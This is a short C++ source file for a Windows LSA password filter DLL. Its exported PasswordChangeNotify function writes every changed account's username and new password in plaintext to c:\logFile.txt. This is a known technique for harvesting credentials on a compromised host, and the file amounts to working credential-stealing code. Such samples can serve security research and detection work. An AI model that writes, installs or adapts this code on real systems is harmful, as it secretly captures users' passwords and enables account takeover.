#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <ntsecapi.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void writeToLog(const char* szString)
{
	FILE *pFile;
	fopen_s(&pFile, "c:\\logFile.txt", "a+");

	if (NULL == pFile)
	{
		return;
	}
	fprintf(pFile, "%s\r\n", szString);
	fclose(pFile);
	return;

}

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void)
{
	OutputDebugString(L"InitializeChangeNotify");
	writeToLog("InitializeChangeNotify()");
	return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(
	PUNICODE_STRING AccountName,
	PUNICODE_STRING FullName,
	PUNICODE_STRING Password,
	BOOLEAN SetOperation)
{
	OutputDebugString(L"PasswordFilter");
	return TRUE;
}

extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword)
{
	FILE *pFile;
	fopen_s(&pFile, "c:\\logFile.txt", "a+");

	OutputDebugString(L"PasswordChangeNotify");
	if (NULL == pFile)
	{
		return true;
	}
	fprintf(pFile, "%ws:%ws\r\n", UserName->Buffer, NewPassword->Buffer);
	fclose(pFile);
	return 0;
}